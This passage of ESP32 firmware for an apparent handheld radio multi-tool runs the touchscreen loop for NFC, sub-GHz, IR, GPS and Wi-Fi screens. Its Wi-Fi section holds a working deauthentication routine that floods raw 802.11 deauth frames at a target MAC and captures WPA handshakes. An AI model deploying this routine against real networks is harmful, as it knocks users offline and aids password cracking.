                   if (ui_ReadTagStatus) {
                       lv_label_set_text(ui_ReadTagStatus, "PN532 NOT FOUND!");
                       lv_obj_set_style_text_color(ui_ReadTagStatus,
                       lv_color_hex(0xFF3030), LV_PART_MAIN | LV_STATE_DEFAULT);
                    }
                }
            } else {
               nfc_scan_active = false;
            }

            if (current_screen == ui_MainMenu) updateMainMenuGui();
            if (current_screen == ui_DeviceInfo) updateDeviceInfoGui();
            if (current_screen == ui_StorageInfo) updateStorageInfoGui();
        }

        if (current_screen == ui_RadioConfig) {
            static bool apply_btn_was_pressed = false;
            bool apply_btn_is_pressed = lv_obj_get_state(ui_RadioConfigAPPLY) & LV_STATE_PRESSED;

            if (apply_btn_is_pressed && !apply_btn_was_pressed) {
                uint16_t freq_idx = lv_dropdown_get_selected(ui_RadioConfigFREQ);
                
                if (freq_idx == 0) current_cc_freq = 315.00;
                else if (freq_idx == 1) current_cc_freq = 433.92;
                else if (freq_idx == 2) current_cc_freq = 868.00;

                cc1101SetReceiveMode(false);
                if (!cc1101_ok) cc1101BeginRadio();

                if (cc1101_ok) {
                    cc1101_last_state = cc1101.setFrequency(current_cc_freq);
                    if (cc1101_last_state == RADIOLIB_ERR_NONE) {
                        lv_label_set_text(ui_Label311, "OK!");
                        lv_obj_set_style_text_color(ui_Label311, lv_color_hex(0x00FF48),
                                                    LV_PART_MAIN | LV_STATE_DEFAULT);
                    } else {
                        lv_label_set_text_fmt(ui_Label311, "ERR %d", cc1101_last_state);
                        lv_obj_set_style_text_color(ui_Label311, lv_color_hex(0xFF3030),
                                                    LV_PART_MAIN | LV_STATE_DEFAULT);
                    }
                } else {
                    lv_label_set_text_fmt(ui_Label311, "CC ERR %d", cc1101_last_state);
                    lv_obj_set_style_text_color(ui_Label311, lv_color_hex(0xFF3030),
                                                LV_PART_MAIN | LV_STATE_DEFAULT);
                }
            } else if (!apply_btn_is_pressed && apply_btn_was_pressed) {
                lv_label_set_text(ui_Label311, "APPLY");
            }
            apply_btn_was_pressed = apply_btn_is_pressed;
        }

        else if (current_screen == ui_WiFiMenu || current_screen == ui_ScanAPs || current_screen == ui_WIFIDetails ||
                 current_screen == ui_DeauthAttack || current_screen == ui_BeaconSpam || current_screen == ui_EvilTwin) {
            
            static bool scan_btn_was_pressed = false;

            if (current_screen == ui_WiFiMenu) {
                bool trigger_scan_is_pressed = lv_obj_get_state(ui_ScanAPsSelect) & LV_STATE_PRESSED;
                if (trigger_scan_is_pressed && !scan_btn_was_pressed && wifi_scan_status == 0) {
                    WiFi.scanDelete(); 
                    WiFi.scanNetworks(true); 
                    wifi_scan_status = 1;
                }
                scan_btn_was_pressed = trigger_scan_is_pressed;
            }
            
            if (current_screen == ui_ScanAPs) {
                bool scan_btn_is_pressed = lv_obj_get_state(ui_SCANAPsButton) & LV_STATE_PRESSED;
                if (scan_btn_is_pressed && !scan_btn_was_pressed && wifi_scan_status == 0) {
                    lv_obj_clean(ui_WIFINetworks);
                    lv_obj_t * loading = lv_label_create(ui_WIFINetworks);
                    lv_label_set_text(loading, "Skenuji site...\n(Plynule na pozadi)");
                    lv_obj_set_style_text_color(loading, lv_color_hex(0xFFFFFF), 0);
                    
                    WiFi.scanDelete(); 
                    WiFi.scanNetworks(true); 
                    wifi_scan_status = 1;
                }
                scan_btn_was_pressed = scan_btn_is_pressed;

                if (wifi_scan_status == 1) {
                    int n = WiFi.scanComplete(); 
                    if (n >= 0) { 
                        lv_obj_clean(ui_WIFINetworks); 
                        if (n == 0) {
                            lv_label_set_text(ui_APsFound, "0");
                        } else {
                            lv_label_set_text_fmt(ui_APsFound, "%d", n);
                            for (int i = 0; i < n; ++i) {
                                create_perfect_wifi_clone(i, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.RSSI(i));
                            }
                        }
                        load_group_for_screen(current_screen); 
                        wifi_scan_status = 0; 
                    }
                }
            } 
            
            if (current_screen == ui_DeauthAttack) {
                static bool deauth_btn_was_pressed = false;
                static bool capture_btn_was_pressed = false;

                bool start_is_pressed = lv_obj_get_state(ui_DeauthAttackSTART) & LV_STATE_PRESSED;
                
                if (start_is_pressed && !deauth_btn_was_pressed) {
                    if (fliphack_target_channel > 0) {
                        deauth_running = !deauth_running; 
                        
                        if (deauth_running) {
                            lv_label_set_text(ui_DeauthAttackSTATUS, "RUNNING");
                            lv_obj_set_style_text_color(ui_DeauthAttackSTATUS, lv_color_hex(0xFF0000), LV_PART_MAIN);
                            lv_label_set_text(ui_Label124, "STOP"); 
                            
                            deauth_packets_sent = 0;
                            deauth_start_time = millis() / 1000;
                            
                            esp_wifi_set_promiscuous(true);
                            esp_wifi_set_channel(fliphack_target_channel, WIFI_SECOND_CHAN_NONE);
                            
                            memcpy(&deauthPacket[10], target_mac, 6); 
                            memcpy(&deauthPacket[16], target_mac, 6); 

                            if (lv_obj_get_state(ui_DeauthAttackCAPTUREHANDSHAKE) & LV_STATE_CHECKED) {
                                start_handshake_capture();
                            }
                            
                        } else {
                            lv_label_set_text(ui_DeauthAttackSTATUS, "STANDBY");
                            lv_obj_set_style_text_color(ui_DeauthAttackSTATUS, lv_color_hex(0xFFFFFF), LV_PART_MAIN);
                            lv_label_set_text(ui_Label124, "START");
                            esp_wifi_set_promiscuous(false);
                            stop_handshake_capture();
                        }
                    } else {
                        lv_label_set_text(ui_DeauthAttackSTATUS, "NO TARGET!");
                    }
                }
                deauth_btn_was_pressed = start_is_pressed;

                bool capture_is_pressed = lv_obj_get_state(ui_DeauthAttackCAPTUREHANDSHAKE) & LV_STATE_PRESSED;
                if (capture_is_pressed && !capture_btn_was_pressed) {
                    if (!handshake_capture_active) {
                        if (deauth_running) start_handshake_capture();
                        lv_label_set_text(ui_Label125, "ON");
                        lv_obj_set_style_border_color(ui_DeauthAttackCAPTUREHANDSHAKE,
                            lv_color_hex(0x00FF48), LV_PART_MAIN | LV_STATE_DEFAULT);
                        lv_obj_set_style_text_color(ui_DeauthAttackCAPTUREHANDSHAKE,
                            lv_color_hex(0x00FF48), LV_PART_MAIN | LV_STATE_DEFAULT);
                    } else {
                        stop_handshake_capture();
                        lv_label_set_text(ui_Label125, "OFF");
                        lv_obj_set_style_border_color(ui_DeauthAttackCAPTUREHANDSHAKE,
                            lv_color_hex(0xB20D0D), LV_PART_MAIN | LV_STATE_DEFAULT);
                        lv_obj_set_style_text_color(ui_DeauthAttackCAPTUREHANDSHAKE,
                            lv_color_hex(0xFF0000), LV_PART_MAIN | LV_STATE_DEFAULT);
                    }
                }
                capture_btn_was_pressed = capture_is_pressed;
                
                if (deauth_running) {
                    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                    deauth_packets_sent += 3;
                    
                    if (deauth_packets_sent % 30 == 0) {
                        lv_label_set_text_fmt(ui_DeauthAttackPKTS, "%d", deauth_packets_sent);
                        uint32_t elapsed = (millis() / 1000) - deauth_start_time;
                        lv_label_set_text_fmt(ui_DeauthAttackTIMER, "%02d:%02d", elapsed / 60, elapsed % 60);
                    }

                    if (handshake_capture_active) {
                        if (handshake_captured) {
                            lv_label_set_text_fmt(ui_DeauthAttackClientMac,
                                "HS: OK! (%d frm)", handshake_count);
                            lv_obj_set_style_text_color(ui_DeauthAttackClientMac,
                                lv_color_hex(0x00FF48), LV_PART_MAIN | LV_STATE_DEFAULT);
                        } else {
                            lv_label_set_text_fmt(ui_DeauthAttackClientMac,
                                "HS: %d/4 frm", handshake_count);
                            lv_obj_set_style_text_color(ui_DeauthAttackClientMac,
                                lv_color_hex(0xFF8800), LV_PART_MAIN | LV_STATE_DEFAULT);
                        }
                    }
                }
            }
        } 
        
        else if (current_screen == ui_SpectrumAnalyzer) {
            
            lv_label_set_text(ui_SpectrumAnalyzerCENTERFREQ, "2.4 GHz");

            lv_chart_series_t * ser = lv_chart_get_series_next(ui_SpectrumAnalyzerCHART, NULL);

            if (ser != NULL) {
                bool has_signal = false;
                
                for(int i = 0; i < 200; i++) {
                    if(nrf24.isCarrierDetected()) {
                        has_signal = true;
                        break;
                    }
                    delayMicroseconds(100);
                }
                
                float current_rssi = has_signal ? -64.0 : -100.0; 

                int chart_val = map((int)current_rssi, -110, -20, 0, 100);
                chart_val = constrain(chart_val, 0, 100); 

                lv_chart_set_next_value(ui_SpectrumAnalyzerCHART, ser, chart_val);
                lv_chart_refresh(ui_SpectrumAnalyzerCHART);

                if (has_signal) {
                    lv_label_set_text(ui_SpectrumAnalyzerPEAK, "Signal!");
                    lv_obj_set_style_text_color(ui_SpectrumAnalyzerPEAK, lv_color_hex(0x08FF00), LV_PART_MAIN);
                } else {
                    lv_label_set_text(ui_SpectrumAnalyzerPEAK, "Cisto");
                    lv_obj_set_style_text_color(ui_SpectrumAnalyzerPEAK, lv_color_hex(0xFFFFFF), LV_PART_MAIN);
                }
            }

            delay(10);
        }
        
        else if (current_screen == ui_FREQAnalyzer) {
            
            lv_label_set_text_fmt(ui_FREQAnalyzerCENTERFREQ, "%.2f MHz", current_cc_freq);

            lv_chart_series_t * ser = lv_chart_get_series_next(ui_FREQAnalyzerCHART, NULL);

            if (ser != NULL) {
                if (!cc1101_ok && millis() - cc1101_last_retry_ms > 3000) {
                    cc1101_last_retry_ms = millis();
                    cc1101BeginRadio();
                }

                if (!cc1101_ok) {
                    lv_chart_set_next_value(ui_FREQAnalyzerCHART, ser, 0);
                    lv_chart_refresh(ui_FREQAnalyzerCHART);
                    lv_label_set_text_fmt(ui_FREQAnalyzerPEAK, "CC ERR %d", cc1101_last_state);
                    lv_obj_set_style_text_color(ui_FREQAnalyzerPEAK, lv_color_hex(0xFF3030), LV_PART_MAIN);
                } else if (!cc1101SetReceiveMode(true)) {
                    lv_chart_set_next_value(ui_FREQAnalyzerCHART, ser, 0);
                    lv_chart_refresh(ui_FREQAnalyzerCHART);
                    lv_label_set_text_fmt(ui_FREQAnalyzerPEAK, "RX ERR %d", cc1101_last_state);
                    lv_obj_set_style_text_color(ui_FREQAnalyzerPEAK, lv_color_hex(0xFF3030), LV_PART_MAIN);
                } else {
                    float current_rssi = cc1101.getRSSI();
                    int chart_val = map((int)current_rssi, -110, -20, 0, 100);
                    chart_val = constrain(chart_val, 0, 100);

                    lv_chart_set_next_value(ui_FREQAnalyzerCHART, ser, chart_val);
                    lv_chart_refresh(ui_FREQAnalyzerCHART);

                    lv_label_set_text_fmt(ui_FREQAnalyzerPEAK, "%.1f dBm", current_rssi);
                    lv_obj_set_style_text_color(ui_FREQAnalyzerPEAK,
                                                current_rssi > -85.0 ? lv_color_hex(0x08FF00) : lv_color_hex(0xFFFFFF),
                                                LV_PART_MAIN);
                }
            }

            delay(50);
        }

        else if (current_screen == ui_IRMenu || current_screen == ui_UniversalRemote || current_screen == ui_LearnSignal ||
                 current_screen == ui_SavedRemotes || current_screen == ui_UniversalIRAttack) {
            if (current_screen == ui_LearnSignal) {
                learnSignalHandleRescanButton();
            }

            if (irrecv.decode(&results)) {
                Serial.print(" ZACHYCEN IR SIGNAL: 0x");
                serialPrintUint64(results.value, HEX);
                Serial.println();

                if (current_screen == ui_LearnSignal) {
                    learnSignalUpdateGui(&results);
                }

                irrecv.resume();
            }
        }

        else if (current_screen == ui_ReadTag) {
            static bool rescan_was_pressed = false;
            static bool save_was_pressed   = false;
            static uint32_t last_scan_ms   = 0;

            bool rescan_is_pressed = ui_ReadTagRESCAN ?
                (lv_obj_get_state(ui_ReadTagRESCAN) & LV_STATE_PRESSED) : false;
            if (rescan_is_pressed && !rescan_was_pressed) {
                nfcResetGui();
                nfc_scan_active = true;
            }
            rescan_was_pressed = rescan_is_pressed;

            bool save_is_pressed = ui_ReadTagSAVE ?
                (lv_obj_get_state(ui_ReadTagSAVE) & LV_STATE_PRESSED) : false;
            if (save_is_pressed && !save_was_pressed) {
                if (nfc_tag_found && sd_card_ok) {
                    nfcSaveTagToSD();
                    if (ui_ReadTagStatus) {
                        lv_label_set_text(ui_ReadTagStatus, "SAVED!");
                        lv_obj_set_style_text_color(ui_ReadTagStatus,
                            lv_color_hex(0x00FF48), LV_PART_MAIN | LV_STATE_DEFAULT);
                    }
                } else if (!sd_card_ok) {
                    if (ui_ReadTagStatus) {
                        lv_label_set_text(ui_ReadTagStatus, "NO SD CARD!");
                        lv_obj_set_style_text_color(ui_ReadTagStatus,
                            lv_color_hex(0xFF3030), LV_PART_MAIN | LV_STATE_DEFAULT);
                    }
                } else {
                    if (ui_ReadTagStatus) {
                        lv_label_set_text(ui_ReadTagStatus, "NO TAG READ YET");
                        lv_obj_set_style_text_color(ui_ReadTagStatus,
                            lv_color_hex(0xFF8800), LV_PART_MAIN | LV_STATE_DEFAULT);
                    }
                }
            }
            save_was_pressed = save_is_pressed;

            if (pn532_ok && nfc_scan_active && !nfc_tag_found) {
                if (millis() - last_scan_ms > 300) {
                    last_scan_ms = millis();

                    uint8_t uid[7] = {0};
                    uint8_t uid_len = 0;

                    bool found = nfc.readPassiveTargetID(
                        PN532_MIFARE_ISO14443A, uid, &uid_len, 50);

                    if (found && uid_len > 0) {

                        if (BUZZER_ON){
                            pinMode(BUZZER_PIN, OUTPUT);
                            playTone(1000, 150); 
                        }
                    
                        memcpy(nfc_last_uid, uid, uid_len);
                        nfc_last_uid_len = uid_len;

                        nfc_last_sak = 0x08; 

                        nfc_last_uid_str  = nfcUidToString(uid, uid_len);
                        nfc_last_type_str = nfcTagTypeName(nfc_last_sak);
                        nfc_tag_found     = true;

                        if (ui_ReadTagUID1)
                            lv_label_set_text(ui_ReadTagUID1,
                                nfc_last_uid_str.c_str());
                        if (ui_ReadTagSAK)
                            lv_label_set_text_fmt(ui_ReadTagSAK,
                                "0x%02X", nfc_last_sak);
                        if (ui_ReadTagType)
                            lv_label_set_text(ui_ReadTagType,
                                nfc_last_type_str.c_str());
                        if (ui_ReadTagStatus) {
                            lv_label_set_text(ui_ReadTagStatus, "TAG FOUND!");
                            lv_obj_set_style_text_color(ui_ReadTagStatus,
                                lv_color_hex(0x00FF48), LV_PART_MAIN | LV_STATE_DEFAULT);
                        }

                        Serial.printf("[NFC] Tag: %s  SAK: 0x%02X  Type: %s\n",
                            nfc_last_uid_str.c_str(),
                            nfc_last_sak,
                            nfc_last_type_str.c_str());
                    }
                }
            }
        }

        else if (current_screen == ui_GPSMenu || current_screen == ui_StartWardriving || current_screen == ui_SateliteInfo ||
                 current_screen == ui_NmeaConsole || current_screen == ui_SyncRTCTime) {


            if (current_screen == ui_SateliteInfo) {
                if (gps.location.isValid()) {
                    lv_label_set_text_fmt(ui_Latitude, "%.5f N", gps.location.lat());
                    lv_label_set_text_fmt(ui_Longtitude, "%.5f E", gps.location.lng());
                } else {
                    lv_label_set_text(ui_Latitude, "N/A");
                    lv_label_set_text(ui_Longtitude, "N/A");
                }
                if (gps.satellites.isValid()) {
                    lv_label_set_text_fmt(ui_Satelites, "%d", gps.satellites.value());
                } else {
                    lv_label_set_text(ui_Satelites, "N/A");
                }
                if (gps.altitude.isValid()) {
                    lv_label_set_text_fmt(ui_Altitude, "%.1f m", gps.altitude.meters());
                } else {
                    lv_label_set_text(ui_Altitude, "N/A");
                }
                if (gps.speed.isValid()) {
                    lv_label_set_text_fmt(ui_Speed, "%.1f km/h", gps.speed.kmph());
                } else {
                    lv_label_set_text(ui_Speed, "N/A");
                }
            }
        
            
            if (current_screen == ui_NmeaConsole) {
                static bool pause_was_pressed = false;
                bool pause_is_pressed = lv_obj_get_state(ui_NmeaConsolePAUSE) & LV_STATE_PRESSED;
                if (pause_is_pressed && !pause_was_pressed) nmea_paused = !nmea_paused;
                pause_was_pressed = pause_is_pressed;

                if (lv_obj_get_state(ui_NmeaConsoleCLEAR) & LV_STATE_PRESSED) {
                    nmea_buffer = "";
                    lv_textarea_set_text(ui_NmeaConsoleTextArea, "");
                }
            }

            if (current_screen == ui_SyncRTCTime) {
                struct timeval tv;
                gettimeofday(&tv, NULL);
                struct tm * timeinfo = localtime(&tv.tv_sec);
                lv_label_set_text_fmt(ui_SyncRTCTimeDeviceTime, "%02d:%02d:%02d", timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);

                if (gps.time.isValid()) {
                    int local_hour = (gps.time.hour() + 2) % 24; 
                    lv_label_set_text_fmt(ui_SyncRTCTimeGPSTime, "%02d:%02d:%02d", local_hour, gps.time.minute(), gps.time.second());
                } else {
                    lv_label_set_text(ui_SyncRTCTimeGPSTime, "Hledam...");
                }

                static bool sync_was_pressed = false;
                bool sync_is_pressed = lv_obj_get_state(ui_SyncRtcTimeSYNC) & LV_STATE_PRESSED;
                if (sync_is_pressed && !sync_was_pressed) {
                    if (gps.date.isValid() && gps.time.isValid()) {
                        struct tm t = {0};
                        t.tm_year = gps.date.year() - 1900;
                        t.tm_mon = gps.date.month() - 1;
                        t.tm_mday = gps.date.day();
                        t.tm_hour = (gps.time.hour() + 2) % 24;
                        t.tm_min = gps.time.minute();
                        t.tm_sec = gps.time.second();
                        
                        time_t timeSinceEpoch = mktime(&t);
                        struct timeval now = { .tv_sec = timeSinceEpoch };
                        settimeofday(&now, NULL); 
                    }
                }
                sync_was_pressed = sync_is_pressed;
            }

            while (Serial1.available() > 0) {
                char c = Serial1.read();
                
                if (current_screen == ui_NmeaConsole && !nmea_paused) {
                    nmea_buffer += c;
                    if (nmea_buffer.length() > 50) {
                        lv_textarea_add_text(ui_NmeaConsoleTextArea, nmea_buffer.c_str());
                        nmea_buffer = "";
                        const char* current_text = lv_textarea_get_text(ui_NmeaConsoleTextArea);
                        if (strlen(current_text) > 800) {
                            lv_textarea_set_text(ui_NmeaConsoleTextArea, current_text + 400); 
                        }
                    }
                }
                
                if (gps.encode(c)) {
                    if (current_screen == ui_SateliteInfo) {
                        if (gps.location.isValid()) {
                            lv_label_set_text_fmt(ui_Latitude, "%.5f N", gps.location.lat());
                            lv_label_set_text_fmt(ui_Longtitude, "%.5f E", gps.location.lng());
                        }
                        if (gps.satellites.isValid()) {
                            lv_label_set_text_fmt(ui_Satelites, "%d", gps.satellites.value());
                        }
                        if (gps.altitude.isValid()) {
                            lv_label_set_text_fmt(ui_Altitude, "%.1f m", gps.altitude.meters());
                        }
                        if (gps.speed.isValid()) {
                            lv_label_set_text_fmt(ui_Speed, "%.1f km/h", gps.speed.kmph());
                        }
                    }
                }
            }
        } 
        
        else if (current_screen == ui_MainMenu || current_screen == ui_BadUsb || current_screen == ui_SDCard ||
                 current_screen == ui_SYSTEM || current_screen == ui_DeviceInfo || current_screen == ui_PowerSleep ||
                 current_screen == ui_PcapManager ||
                 current_screen == ui_StorageInfo || current_screen == ui_FormatSD || current_screen == ui_SavedPayloads ||
                 current_screen == ui_SDRemoteAction || current_screen == ui_PcapAction || current_screen == ui_SDCardBeacon ||
                 current_screen == ui_SelectTargetBeacon || current_screen == ui_PortalSelectScreen) {
        }
        
        if (current_screen != ui_GPSMenu && current_screen != ui_StartWardriving && 
            current_screen != ui_SateliteInfo && current_screen != ui_NmeaConsole && 
            current_screen != ui_SyncRTCTime && current_screen != ui_SpectrumAnalyzer &&
            current_screen != ui_RadioConfig && current_screen != ui_FREQAnalyzer) {
            while (Serial1.available() > 0) Serial1.read();
        }

        delay(5);
    }
}


